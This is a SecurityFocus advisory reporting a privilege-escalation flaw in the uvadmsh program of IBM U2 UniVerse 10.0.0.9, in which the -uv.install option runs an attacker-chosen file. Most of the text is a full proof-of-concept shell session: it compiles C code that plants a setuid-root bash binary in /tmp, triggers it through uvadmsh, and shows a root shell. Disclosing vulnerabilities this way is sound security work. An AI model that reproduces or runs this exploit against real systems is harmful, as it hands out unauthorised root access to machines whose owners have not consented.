source: http://www.securityfocus.com/bid/8203/info

A vulnerability has been reported in the IBM U2 UniVerse uvadmsh program that could permit the uvadm user to execute arbitrary code with elevated privileges. The -uv.install option of the vulnerable program allows a user to specify an arbitrary path to a file. In cases where uvadmsh is installed setuid root, this could be abused to run an executable file of the attacker's choosing.

While this vulnerability was reported in UniVerse version 10.0.0.9, previous versions are likely vulnerable as well. 

[uvadm@vegeta uvadm]$ cat > /tmp/uv.install.c
main()
{
setuid(0);
system("cc -o /tmp/owned /tmp/owned.c");
system("chmod 4755 /tmp/owned");
}

[uvadm@vegeta uvadm]$ cc -o /tmp/uv.install /tmp/uv.install.c
[uvadm@vegeta uvadm]$ cat > /tmp/owned.c
main()
{
setuid(0);
system("/bin/bash");
}

[uvadm@vegeta uvadm]$ ls -al /tmp/owned
ls: /tmp/owned: No such file or directory

[uvadm@vegeta uvadm]$ /usr/ibm/uv/bin/uvadmsh -uv.install /tmp
[uvadm@vegeta uvadm]$ ls -al /tmp/owned
-rwsr-xr-x 1 root uvadm 11640 Jul 2 20:15 /tmp/owned

[uvadm@vegeta uvadm]$ /tmp/owned
[root@vegeta uvadm]# id
uid=0(root) gid=503(uvadm) groups=503(uvadm) 